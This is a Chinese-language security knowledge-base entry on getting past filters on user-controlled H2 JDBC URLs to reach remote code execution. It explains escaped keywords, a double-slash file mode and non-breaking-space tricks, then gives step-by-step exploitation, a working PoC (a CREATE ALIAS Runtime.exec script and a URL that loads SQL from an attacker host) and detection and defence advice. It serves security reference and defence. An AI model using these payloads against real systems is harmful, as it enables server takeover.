---
id: web-java-component-h2-jdbc-url-filter-bypass-runscript
title: H2 JDBC URL 过滤绕过：RUN\SCRIPT 转义、双斜杠文件模式与不可见空格
type: scenario
domain: web
path: web/java/component
technique: h2-jdbc-url-filter-bypass-runscript
tags:
- java
- h2
- jdbc
- waf-bypass
- url-parsing
- runscript
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:15:59+08:00'
  notes: 已对照原文与18张图核对；H2反斜杠转义、jdbc:h2://文件模式/POSIX斜杠折叠、U+00A0空白绕过、CREATE ALIAS执行链均与原文一致；未复跑
url: /docs/web/java/component/web-java-component-h2-jdbc-url-filter-bypass-runscript/
draft: false
kb_aliases:
- H2 JDBC 绕过
- RUNSCRIPT 关键字绕过
- H2 INIT 绕过
- jdbc:h2:// 双斜杠
- 不可见空格绕过 WAF
- H2 URL 过滤器绕过
---

## 一句话结论

当应用允许用户控制 H2 JDBC URL、但用关键字/正则/空白字符过滤 `INIT`、`RUNSCRIPT`、空格时，可用 H2 自身的 URL 转义把 `INIT`/`RUNSCRIPT` 写成 `IN\IT`/`RUN\SCRIPT`，用 `jdbc:h2://mem/testdb` 满足 `jdbc:...://` 正则并落到文件模式，再用 U+00A0 等不可见空白替代空格，最终让 `INIT=RUNSCRIPT FROM '远程SQL'` 执行。

## 原理

- H2 支持在 JDBC URL 中通过 `INIT=` 在建立连接时执行 SQL；`RUNSCRIPT FROM '<url>'` 可加载远程或本地 SQL 脚本，脚本内 `CREATE ALIAS ... AS $$ Java 源码 $$` 可定义 Java 函数并 `CALL` 执行系统命令。
- H2 的 URL 属性解析会把反斜杠当作转义符：`IN\IT` 解析为 `INIT`，`RUN\SCRIPT` 解析为 `RUNSCRIPT`；因此只匹配连续关键字的过滤器会被绕过。
- 应用常要求 JDBC URL 形如 `^jdbc:[a-zA-Z0-9]+://[^\s]+$`。标准 H2 内存写法 `jdbc:h2:mem:testdb` 不含 `://`，不满足；写成 `jdbc:h2://mem/testdb` 时 H2 把 `//mem/testdb` 当路径处理，进入文件模式。POSIX 下连续前导斜杠折叠为一个，等价于 `/mem/testdb`；Windows 则需换成合法盘符路径（如省略 `file:` 的 `jdbc:h2:E:/tmp/testdb`）。
- 过滤空白/控制字符时，H2 仍把部分 Unicode 空白视为分隔符；用 U+00A0（不换行空格）代替 `FROM` 与 URL 之间的普通空格可同时通过过滤器与 H2 解析。
- 组合后 URL 形如 `jdbc:h2://mem/testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\IT=RUN\SCRIPT<NBSP>FROM'http://attacker/poc.sql'`，驱动连接时拉取并执行远程 SQL。

## 触发条件

- 目标 classpath 有 H2 驱动（常见于内置数据库、监控/测试组件）。
- 用户可控制 JDBC URL（监控模板、数据源配置、连接测试等）。
- 应用存在字符串/正则/空白过滤，但未在 H2 解析后做语义校验。
- 目标可出网访问攻击者的 SQL 地址，或可让 `RUNSCRIPT` 读取本地可控文件。

## 利用步骤

1. 确认 JDBC URL 可控，观察报错判断 H2 版本与过滤规则。
2. 构造远程 SQL：`CREATE ALIAS` 定义调用 `Runtime.exec` 的 Java 函数并 `CALL`。
3. 关键字绕过：`INIT` → `IN\IT`，`RUNSCRIPT` → `RUN\SCRIPT`。
4. 格式绕过：把 `jdbc:h2:mem:testdb` 改成 `jdbc:h2://mem/testdb`（Linux）；Windows 用合法盘符路径。
5. 空格绕过：`FROM` 后使用 U+00A0（或其它 H2 接受的不可见空白）。
6. 提交 URL 并触发连接，观察命令执行结果。

## PoC

远程 SQL（poc.sql）：

```sql
CREATE ALIAS EXEC AS $$
void shellexec() throws java.io.IOException {
    Runtime.getRuntime().exec("touch /tmp/pwned");
}
$$;
CALL EXEC();
```

恶意 JDBC URL（`\u00A0` 表示不换行空格）：

```text
jdbc:h2://mem/testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\IT=RUN\SCRIPT\u00A0FROM'http://attacker/poc.sql'
```

JSON 参数中的实际形态（注意 JSON 需转义反斜杠）：

```json
{"paramValue":"jdbc:h2://mem/testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\\IT=RUN\\SCRIPT\u00A0FROM'http://attacker/poc.sql'"}
```

## 变体与关联

- 变体：`RUNSCRIPT` 也可替换为 `INIT=CREATE ALIAS ...` 直接执行，若无空格限制则无需 `RUNSCRIPT`。
- 变体：不可见空白可尝试其他 Unicode 空白/控制字符；不同 H2 版本对空白集合的处理可能不同。
- 变体：`//` 文件模式在 Linux 下依赖前导斜杠折叠；Windows 需使用盘符路径，绕过方式不同。
- 关联：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（H2 INIT + CREATE ALIAS 的基础利用链）。
- 关联：[[web-java-component-hertzbeat-h2-jdbc-url-bypass-rce]]（本绕过在 Hertzbeat 后台的具体落地）。
- 边界：应用在 H2 解析后按属性白名单校验、禁用 `INIT`、移除 H2 依赖、或目标不出网时，利用不成立。

## 检测与防御

- 检测：JDBC URL 中出现 `IN\IT`、`RUN\SCRIPT`、`jdbc:h2://`、`\u00A0` 或其他非常规空白、`INIT=`、`RUNSCRIPT`、`CREATE ALIAS`。
- 防御：不要允许用户控制 JDBC URL；按驱动与地址白名单校验，并在 H2 解析后按属性名/值做语义校验。
- 加固：升级/配置 H2 禁止 URL 中的 `INIT`；生产环境移除 H2；限制应用出网；对监控/数据源配置功能做权限控制与审计。
